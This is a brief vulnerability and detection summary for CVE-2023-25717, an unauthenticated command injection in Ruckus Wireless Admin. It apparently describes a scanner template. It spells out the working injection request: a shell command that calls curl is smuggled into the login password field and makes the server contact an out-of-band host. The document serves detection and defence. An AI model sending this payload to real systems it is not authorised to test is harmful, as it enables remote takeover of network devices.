## Vulnerability
Ruckus Wireless Admin through 10.4 allows unauthenticated remote code execution via command injection. An attacker can send a crafted HTTP GET request to the login endpoint that injects arbitrary shell commands, resulting in full system compromise (arbitrary code execution as the web server user).  
**CVE ID:** CVE-2023-25717  
**CWE:** CWE-94 (Code Injection)  
**CVSS 3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
**Impact:** Remote code execution vulnerability in Ruckus Wireless Admin allows attackers to execute arbitrary code on the target system.  
**Remediation:** Apply the latest security patches and updates provided by Ruckus Wireless.  
**Tags:** cve2023, cve, ruckus, rce, kev, ruckuswireless, vkev, vuln.

## PoC / Detection
Classification: rce  
The template sends one unauthenticated GET request to `{{BaseURL}}/forms/doLogin?login_username=admin&password=password$(curl%20{{interactsh-url}})&x=0&y=0`. The payload injects a shell command (`$(curl {{interactsh-url}})`) into the password field, which is executed by the vulnerable login handler if the flaw is present. Detection relies on an out-of-band HTTP callback to interactsh, matching on HTTP protocol, curl User-Agent string in the inbound request, and the server returning HTTP 302.
